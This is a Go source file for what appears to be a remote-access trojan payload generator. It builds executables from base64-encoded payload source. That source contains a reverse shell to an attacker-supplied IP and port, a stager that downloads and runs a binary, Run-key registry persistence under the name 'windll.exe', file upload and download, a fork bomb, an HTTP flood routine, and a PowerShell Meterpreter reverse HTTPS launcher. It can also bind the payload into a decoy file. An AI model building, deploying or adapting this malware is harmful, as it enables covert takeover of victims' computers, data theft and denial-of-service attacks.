package main



import "strings"
import "fmt"
import "os"
import "runtime"
import "io/ioutil"
import "os/exec"
import "path/filepath"
import "encoding/base64"
import "github.com/fatih/color"



var ARG string
var PAYLOAD string
var PAYLOAD_TYPE string = "Windows"
var PERSISTENCE bool
var DISPATCH bool = false
var ARC string = "386" 
var LINKER string = "static"





func main() { // 192.168.1.1 8888 -p windows -a x86 -l static 
  dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
  ARGS := os.Args[1:]



  if len(ARGS) == 0 {
    color.Yellow(HELP)
    os.Exit(1)
  }

  if len(ARGS[0]) < 7 || len(ARGS[0]) > 15 {
    color.Red("\n[-] ERROR : Invalid IP !")
    os.Exit(1)
  }

  if len(ARGS[1]) < 1 || len(ARGS[1]) > 5 {
    color.Red("\n[-] ERROR : Invalid Port !")
    os.Exit(1)
  }

  for i := 0; i < len(ARGS); i++ {
    if i == 0 {
      ARG = ARGS[i]
    }else{
      ARG = (ARG +" "+ ARGS[i])
    }
  }

  if strings.Contains(ARG, "-a x86") || strings.Contains(ARG, "-A X86") || strings.Contains(ARG, "-A x86") || strings.Contains(ARG, "-a X86") {
    ARC = "386"
  }else if strings.Contains(ARG, "-a x64") || strings.Contains(ARG, "-A X64") || strings.Contains(ARG, "-a X64") || strings.Contains(ARG, "-A x64") {
    ARC = "amd64"
  }else if strings.Contains(ARG, "-a") || strings.Contains(ARG, "-A") {
    color.Red("\n[-] ERROR : Invalid Architecture !")
    os.Exit(1)
  }

 if  strings.Contains(ARG, "-l static") || strings.Contains(ARG, "-L STATIC") || strings.Contains(ARG, "-l STATIC") || strings.Contains(ARG, "-L static") {
  LINKER =  "static"
 }else if strings.Contains(ARG, "-l dynamic") || strings.Contains(ARG, "-L DYNAMIC") || strings.Contains(ARG, "-l DYNAMIC") || strings.Contains(ARG, "-L dynamic") {
  LINKER = "dynamic"
 }else if strings.Contains(ARG, "-l") {
  color.Red("\n[-] ERROR : Invalid Linker !")
  os.Exit(1)
 }




  if strings.Contains(ARG, "-p windows") || strings.Contains(ARG, "-P WINDOWS") || strings.Contains(ARG, "-p Windows") || strings.Contains(ARG, "-P windows") || strings.Contains(ARG, "-p WINDOWS") || strings.Contains(ARG, "-P Windows") {
    WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
    PAYLOAD = string(WINDOWS_PAYLOAD)
    PAYLOAD_TYPE = "Windows"
  }else if strings.Contains(ARG, "-p win_stager") || strings.Contains(ARG, "-P WIN_STAGER") || strings.Contains(ARG, "-p Win_Stager") || strings.Contains(ARG, "-P win_stager") || strings.Contains(ARG, "-p WIN_STAGER") || strings.Contains(ARG, "-P Win_Stager") {
    WINDOWS_STAGER_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_STAGER_PAYLOAD)
    PAYLOAD = string(WINDOWS_STAGER_PAYLOAD)
    PAYLOAD_TYPE = "Windows Stager"
  }else if strings.Contains(ARG, "-p linux") || strings.Contains(ARG, "-P LINUX") || strings.Contains(ARG, "-p Linux") || strings.Contains(ARG, "-P linux") || strings.Contains(ARG, "-p LINUX") || strings.Contains(ARG, "-P Linux") {
    LINUX_PAYLOAD, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)
    PAYLOAD = string(LINUX_PAYLOAD)
    PAYLOAD_TYPE = "Linux"
  }else if strings.Contains(ARG, "-p osx") || strings.Contains(ARG, "-P OSX") || strings.Contains(ARG, "-p OSX") || strings.Contains(ARG, "-P osx") {
    OSX_PAYLOAD, _ := base64.StdEncoding.DecodeString(OSX_PAYLOAD)
    PAYLOAD = string(OSX_PAYLOAD)
    PAYLOAD_TYPE = "OSX"
  }else if strings.Contains(ARG, "-p") || strings.Contains(ARG, "-P") {
    color.Red("\n[-] ERROR : Invalid Payload !")
    os.Exit(1)
  }else {
    PAYLOAD_TYPE = "Windows"
  	WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
    PAYLOAD = string(WINDOWS_PAYLOAD)
  }


  if strings.Contains(ARG, "--persistence") || strings.Contains(ARG, "--PERSISTENCE") || strings.Contains(ARG, "--Persistence") {
    PERSISTENCE = true
  }else{
    PERSISTENCE = false
  }




  if strings.Contains(ARG, "--embed=") || strings.Contains(ARG, "--Embed=") || strings.Contains(ARG, "--EMBED=") {
    DISPATCH = true;
  }else{
    DISPATCH = false;
  }






//####################################################################### PARAMETER CHECKS ##############################################################//





  if DISPATCH == true {
    FileName := strings.Split(ARG, "=");

    File, err := ioutil.ReadFile(FileName[1])
    if err != nil {
      ErrorMessage := string("[!] Unable to acces "+FileName[1])
      color.Red(ErrorMessage)
    }else{
      EncodedFile := base64.StdEncoding.EncodeToString(File)
      GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(PAYLOAD), ARC, LINKER, PERSISTENCE,EncodedFile,FileName[1])
    }

  }else{
  	GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(PAYLOAD), ARC, LINKER, PERSISTENCE,"","")
  }
  

  color.Blue("\n\n[*] Payload : "+PAYLOAD_TYPE)
  color.Blue("\n[*] Architecture : "+ARC)
  color.Blue("\n[*] Linker : "+LINKER)
  if PERSISTENCE == true {
    color.Blue("\n[*] Persistence : Enabled")  
  }else{
    color.Blue("\n[*] Persistence : Disabled")
  }

  if DISPATCH == true {
    FileName := strings.Split(ARG, "=");
    Info := string("\n[*] File Embeding : Payload merged with "+FileName[1])
    color.Blue(Info)
    Info = string("\n\n[+] Payload generated as Payload_" + FileName[1] + " at "+dir)
    color.Green(Info)
  }else{
    color.Blue("\n[*] File Embeding : Disabled")
    color.Green(string("\n\n[+] Payload generated as Payload.exe at "+dir))
  }
  
   
}


func GENERATE_PAYLOAD(IP string, PORT string, PAYLOAD string, ARC string, LINKER string, PERSISTENCE bool, ENCODED_FILE string, ENCODED_FILENAME string) {

  IP = string("\""+IP+"\";")
  PORT = string("\""+PORT+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()
  Index := strings.Replace(PAYLOAD, "\"127.0.0.1\";", IP, -1)
  Index = strings.Replace(Index, "\"8552\";", PORT, -1)

  if PERSISTENCE == true {
    Index = strings.Replace(Index, "BACKDOOR bool = false;", "BACKDOOR bool = true;", -1)
  }

  if DISPATCH == true  {
    Index = strings.Replace(Index, "EMBEDDED bool = false;", "EMBEDDED bool = true;", -1)
    Index = strings.Replace(Index, "//INSERT-BINARY-HERE//", string(ENCODED_FILE), -1)
  }


  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    if LINKER == "static" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui\" Payload.go ")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("set GOARC="+ARC+"\ngo build -ldflags \"-H windowsgui -s\" Payload.go ")
    }


    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    } 
    Builder.WriteString(LINKER)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()

    if DISPATCH == true {
      Temp := string("rename Payload.exe Payload_"+ENCODED_FILENAME)
      exec.Command("cmd", "/C", Temp).Run()
    }

  }else if runtime.GOOS == "linux" {

    if LINKER == "static" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
      LINKER = string("export GOOS=windows && export GOARC="+ARC+" && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARC=amd64")
    }

    exec.Command("sh", "-c", LINKER).Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
    if DISPATCH == true {
      Temp := string("rename Payload_Payload.exe "+ENCODED_FILENAME)
      exec.Command("sh", "-c", Temp).Run()
    }
  }
}




var WINDOWS_STAGER_PAYLOAD = `cGFja2FnZSBtYWluCgoKaW1wb3J0ICJvcyIKaW1wb3J0ICJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJpbyIKaW1wb3J0ICJvcy9leGVjIgppbXBvcnQgInN5c2NhbGwiCgpjb25zdCBJUCA9ICIxMjcuMC4wLjEiOwpjb25zdCBQT1JUID0gIjg1NTIiOwoKZnVuYyBtYWluKCkgewogIAogIENvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgSVArIjoiK1BPUlQpOwogIGlmIGVyciAhPSBuaWwgeyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIHRpbWUuU2xlZXAoNCp0aW1lLlNlY29uZCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgbWFpbigpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogIH07CiAgZmlsZSwgXyA6PSBvcy5DcmVhdGUoIndpbmRsbC5leGUiKTsKICBpby5Db3B5KGZpbGUsIENvbm5lY3QpOwogIE1vdmVfU3RyaW5nIDo9IHN0cmluZygibW92ZSB3aW5kbGwuZXhlICIrIiUiKyJhcHBkYXRhIisiJSIpCiAgTW92ZSA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIE1vdmVfU3RyaW5nKTsKICBNb3ZlLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgTW92ZS5SdW4oKQogIEV4ZWN1dGVfU3RyaW5nIDo9IHN0cmluZygiJSIrImFwcGRhdGEiKyIlIisiXFx3aW5kbGwuZXhlIikKICBFeGVjdXRlIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgRXhlY3V0ZV9TdHJpbmcpOwogIEV4ZWN1dGUuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBFeGVjdXRlLlJ1bigpCn0=`
var WINDOWS_PAYLOAD string = `CnBhY2thZ2UgbWFpbjsKCmltcG9ydCAibmV0IjsKaW1wb3J0ICJvcy9leGVjIjsKaW1wb3J0ICJidWZpbyI7IAppbXBvcnQgIm9zIjsKaW1wb3J0ICJzdHJpbmdzIjsKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIjsKaW1wb3J0ICJzeXNjYWxsIjsKaW1wb3J0ICJuZXQvaHR0cCI7CmltcG9ydCAidGltZSI7CmltcG9ydCAiaW8iOwppbXBvcnQgImJ5dGVzIgppbXBvcnQgImNvbXByZXNzL2ZsYXRlIgppbXBvcnQgImVuY29kaW5nL2Jhc2U2NCIKCgoKY29uc3QgSVAgc3RyaW5nID0gIjEyNy4wLjAuMSI7CmNvbnN0IFBPUlQgc3RyaW5nID0gIjg1NTIiOwpjb25zdCBCQUNLRE9PUiBib29sID0gZmFsc2U7CmNvbnN0IEVNQkVEREVEIGJvb2wgPSBmYWxzZTsKY29uc3QgVElNRV9ERUxBWSB0aW1lLkR1cmF0aW9uID0gNTsvL1NlY29uZAoKdmFyIEdMT0JBTF9DT01NQU5EIHN0cmluZzsKdmFyIERPU19UYXJnZXQgc3RyaW5nOwp2YXIgRE9TX1JlcXVlc3RfQ291bnRlciBpbnQgPSAwOwp2YXIgRE9TX1JlcXVlc3RfTGltaXQgaW50ID0gMTAwMDsKCnZhciBJUF9QT1JUIHN0cmluZzsgLy8gRk9SIE1FVEVSUFJFVEVSCgpmdW5jIG1haW4oKSB7CgogIGlmIEVNQkVEREVEID09IHRydWUgewogICAgRElTUEFUQ0goKQogIH0KCgogIGlmIEJBQ0tET09SID09IHRydWUgewogICAgUEVSU0lTVCgpCiAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIAogIGNvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgSVArIjoiK1BPUlQpOyAgICAgICAgICAgICAgICAgICAgICAgCiAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIHRpbWUuU2xlZXAoVElNRV9ERUxBWSp0aW1lLlNlY29uZCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICB9OyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAKICBkaXIsIF8gOj0gZmlsZXBhdGguQWJzKGZpbGVwYXRoLkRpcihvcy5BcmdzWzBdKSk7ICAgICAKICBWZXJzaW9uX0NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgInZlciIpOwogIFZlcnNpb25fQ2hlY2suU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICB2ZXJzaW9uLCBfIDo9IFZlcnNpb25fQ2hlY2suT3V0cHV0KCk7ICAgICAgICAgICAKICBTeXNHdWlkZSA6PSAoQkFOTkVSK3N0cmluZyh2ZXJzaW9uKSArICJcblxuIiArIHN0cmluZyhkaXIpICsgIj4iKTsgICAgICAKICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoU3lzR3VpZGUpKSk7ICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogCiAgCiAgZm9yIHsKICAgIAogICAgQ29tbWFuZCwgXyA6PSBidWZpby5OZXdSZWFkZXIoY29ubmVjdCkuUmVhZFN0cmluZygnXG4nKTsgICAgICAgICAgICAgICAgICAgICAgIAogICAgX0NvbW1hbmQgOj0gc3RyaW5nKENvbW1hbmQpOyAgICAgICAgICAgICAgICAgICAgICAKICAgIEdMT0JBTF9DT01NQU5EID0gX0NvbW1hbmQ7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIAoKICAgIAogICAgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5wbGVhc2UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiflBMRUFTRSIpIHsgCiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKFNBWV9QTEVBU0UoKSkpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kb3dubG9hZCAtZiIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+RE9XTkxPQUQgLUYgIikgewogICAgICBnbyBET1dOTE9BRCgpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5bKl0gU2VuZGluZyBmaWxlIHRvIC0+ICIrSVArIjo1NTg4OFxuXG4iKSk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuIitzdHJpbmcoZGlyKSsiPiIpKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+dXBsb2FkIC1mIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5VUExPQUQgLUYgIikgewogICAgICBnbyBVUExPQUQoKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuWypdIFJlY2VpdmluZyBmaWxlIGZyb20gLT4gIitJUCsiOjU1ODg4XG5cbiIpKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG4iK3N0cmluZyhkaXIpKyI+IikpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5NRVRFUlBSRVRFUiAtQSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+bWV0ZXJwcmV0ZXIgLWEiKSB7CiAgICAgIFRlbXBfSVBfUE9SVCA6PSBzdHJpbmdzLlNwbGl0KF9Db21tYW5kLCAiXCIiKQogICAgICBJUF9QT1JUID0gc3RyaW5nKFRlbXBfSVBfUE9SVFsxXSkKICAgICAgTUVURVJQUkVURVJfQ1JFQVRFKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWytdIE1ldGVycHJldGVyIEV4ZWN1dGVkICFcblxuIitkaXIrIj4iKSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+RE9TIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kb3MiKSB7CiAgICAgIERPU19Db21tYW5kIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpCiAgICAgIERPU19UYXJnZXQgPSAgRE9TX0NvbW1hbmRbMV0KICAgICAgaWYgc3RyaW5ncy5Db250YWlucyhzdHJpbmcoRE9TX1RhcmdldCksICJodHRwIikgewogICAgICAgIGdvIERPUygpOwogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWypdIFN0YXJ0aW5nIERPUyBhdGFjay4uLiIrIlxuXG5bKl0gU2VuZGluZyAxMDAwIHJlcXVlc3QgdG8gIitET1NfVGFyZ2V0KyIgIVxuXG4iK2RpcisiPiIpKTsKICAgICAgfWVsc2V7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bLV0gRVJST1I6IEludmFsaWQgdXJsICFcblxuIitkaXIrIj4iKSk7CiAgICAgIH0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkRJU1RSQUNUIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5kaXN0cmFjdCIpIHsgCiAgICAgIERJU1RSQUNUKCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+SEVMUCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+aGVscCIpIHsgCiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhIRUxQK2RpcisiPiIpKSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiflBFUlNJU1RFTkNFIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5wZXJzaXN0ZW5jZSIpIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIGdvIFBFUlNJU1QoKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bKl0gQWRkaW5nIHBlcnNpc3RlbmNlIHJlZ2lzdHJpZXMuLi5cblsqXSBQZXJzaXN0ZW5jZSBDb21wbGV0ZWRcblxuIitkaXIrIj4iKSk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZXsKICAgICAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgX0NvbW1hbmQpOwogICAgICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgICAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsKICAgICAgQ29tbWFuZF9PdXRwdXQgOj0gc3RyaW5nKCJcblxuIitzdHJpbmcob3V0KSsiXG4iK3N0cmluZyhkaXIpKyI+Iik7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKENvbW1hbmRfT3V0cHV0KSk7CiAgICB9OwogIH07Cn07CgoKCgoKZnVuYyBQRVJTSVNUKCkgewogIFBFUlNJU1QsIF8gOj0gb3MuQ3JlYXRlKCJQRVJTSVNULmJhdCIpCgogIFBFUlNJU1QuV3JpdGVTdHJpbmcoIm1rZGlyICVBUFBEQVRBJVxcV2luZG93cyIrIlxuIikKICBQRVJTSVNULldyaXRlU3RyaW5nKCJjb3B5ICIgKyBvcy5BcmdzWzBdICsgIiAlQVBQREFUQSVcXFdpbmRvd3NcXHdpbmRsbC5leGVcbiIpCiAgUEVSU0lTVC5Xcml0ZVN0cmluZygiUkVHIEFERCBIS0NVXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuIC9WIFdpbkRsbCAvdCBSRUdfU1ogL0YgL0QgJUFQUERBVEElXFxXaW5kb3dzXFx3aW5kbGwuZXhlIikKCiAgUEVSU0lTVC5DbG9zZSgpCgogIEV4ZWMgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAiUEVSU0lTVC5iYXQiKTsKICBFeGVjLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgRXhlYy5SdW4oKTsKICBDbGVhbiA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJkZWwgUEVSU0lTVC5iYXQiKTsKICBDbGVhbi5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIENsZWFuLlJ1bigpOwoKfTsKCgoKZnVuYyBVUExPQUQoKSB7CiAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBJUCsiOiIrIjU1ODg4Iik7CiAgaWYgZXJyICE9IG5pbCB7CiAgICBVUExPQUQoKTsKICB9OwogIGZpbGVfbmFtZSA6PSBzdHJpbmdzLlNwbGl0KEdMT0JBTF9DT01NQU5ELCAiXCIiKTsKICBmaWxlLCBfIDo9IG9zLkNyZWF0ZShmaWxlX25hbWVbMV0pOwogIGZpbGVfbmFtZVsxXSA9IHN0cmluZ3MuVHJpbShmaWxlX25hbWVbMV0sICIgIik7CiAgaW8uQ29weShmaWxlLCBjb25uZWN0KTsKICBmaWxlLkNsb3NlKCk7CiAgY29ubmVjdC5DbG9zZSgpOwp9OwoKCmZ1bmMgRE9XTkxPQUQoKSB7CiAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBJUCsiOiIrIjU1ODg4Iik7CiAgaWYgZXJyICE9IG5pbCB7CiAgICBET1dOTE9BRCgpOwogIH07CiAgZmlsZV9uYW1lIDo9IHN0cmluZ3MuU3BsaXQoR0xPQkFMX0NPTU1BTkQsICJcIiIpOwogIGZpbGUsIF8gOj0gb3MuT3BlbihmaWxlX25hbWVbMV0pOwogIGlvLkNvcHkoY29ubmVjdCwgZmlsZSk7CiAgZmlsZS5DbG9zZSgpOwogIGNvbm5lY3QuQ2xvc2UoKTsKfTsKCgoKCmZ1bmMgU0FZX1BMRUFTRSgpIChzdHJpbmcpewogIENvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHTE9CQUxfQ09NTUFORCwgIlwiIik7CiAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKCJwb3dlcnNoZWxsLmV4ZSAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIC1WZXJiIFJ1bkFzICIrc3RyaW5nKENvbW1hbmRbMV0pKSk7CiAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsKICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoc3RyaW5nKG91dCkpOwogIHJldHVybiBDb21tYW5kX091dHB1dDsKfTsKCgoKCmZ1bmMgRElTVFJBQ1QoKSB7CiAgdmFyIEZvcmtfQm9tYiBzdHJpbmcgPSAiOkFcbnN0YXJ0XG5nb3RvIEEiCiAgRl9Cb21iLCBfIDo9IG9zLkNyZWF0ZSgiRl9Cb21iLmJhdCIpCgogIEZfQm9tYi5Xcml0ZVN0cmluZyhGb3JrX0JvbWIpCgogIEZfQm9tYi5DbG9zZSgpCgogIGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIkZfQm9tYi5iYXQiKS5TdGFydCgpCgp9CgoKZnVuYyBET1MoKSB7CiAgZm9yIHsKICAgIERPU19SZXF1ZXN0X0NvdW50ZXIrKwogICAgcmVzcG9uc2UsIGVyciA6PSBodHRwLkdldChET1NfVGFyZ2V0KTsKICAgIGlmIGVyciAhPSBuaWwgewogICAgICBicmVhazsKICAgIH0KICAgIHJlc3BvbnNlLkJvZHkuQ2xvc2UoKTsKICAgIGlmIERPU19SZXF1ZXN0X0NvdW50ZXIgPCBET1NfUmVxdWVzdF9MaW1pdCB7CiAgICAgIGdvIERPUygpCiAgICB9ZWxzZXsKICAgICAgYnJlYWs7CiAgICB9IAogIH0KfQoKCgpmdW5jIE1FVEVSUFJFVEVSX0NSRUFURSgpIHsKCiAgdmFyIEJ1ZmZlciBieXRlcy5CdWZmZXIKICB2YXIgUG93ZXJzaGVsbF9SZXZlcnNlX0h0dHBzIHN0cmluZyA9IFJFVkVSU0VfSFRUUFNfU0hFTEwoc3RyaW5nKElQX1BPUlQpKQoKICBGbGF0ZSwgXyA6PSBmbGF0ZS5OZXdXcml0ZXIoJkJ1ZmZlciw2KQogIGlmIF8sIGVyciA6PSBGbGF0ZS5Xcml0ZShbXWJ5dGUoUG93ZXJzaGVsbF9SZXZlcnNlX0h0dHBzKSk7IGVyciAhPSBuaWwgewogICAgcGFuaWMoZXJyKQogIH0KICBpZiBlcnIgOj0gRmxhdGUuRmx1c2goKTsgZXJyICE9IG5pbCB7CiAgICBwYW5pYyhlcnIpCiAgfQogIGlmIGVyciA6PSBGbGF0ZS5DbG9zZSgpOyBlcnIgIT0gbmlsIHsKICAgIHBhbmljKGVycikKICB9CgogIEJ1ZmZlclN0cmluZyA6PSBCdWZmZXIuQnl0ZXMoKQogIEVuY29kZWRDb21wcmVzc2VkQnVmZmVyIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5FbmNvZGVUb1N0cmluZyhbXWJ5dGUoQnVmZmVyU3RyaW5nKSkKCgogIHZhciBQU19NZXRlcnByZXRlciBzdHJpbmcgPSBDUkVBVEVfUFNfTUVURVJQUkVURVIoRW5jb2RlZENvbXByZXNzZWRCdWZmZXIpCgogIEZpbGUsIF8gOj0gb3MuQ3JlYXRlKCJXaW5kbGwuYmF0IikKICBGaWxlLldyaXRlU3RyaW5nKFBTX01ldGVycHJldGVyKQoKICBGaWxlLkNsb3NlKCk7CgogIFRlbXBDb21tYW5kIDo9IHN0cmluZygibW92ZSB3aW5kbGwuYmF0ICUiKyJBUFBEQVRBIisiJSIpCgogIE1vdmUgOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCBUZW1wQ29tbWFuZCk7CiAgTW92ZS5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIE1vdmUuUnVuKCk7CgogIFRlbXBDb21tYW5kXzIgOj0gc3RyaW5nKCIlIisiQVBQREFUQSIrIiUiKyJcXHdpbmRsbC5iYXQiKQoKICBFeGVjIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgVGVtcENvbW1hbmRfMik7CiAg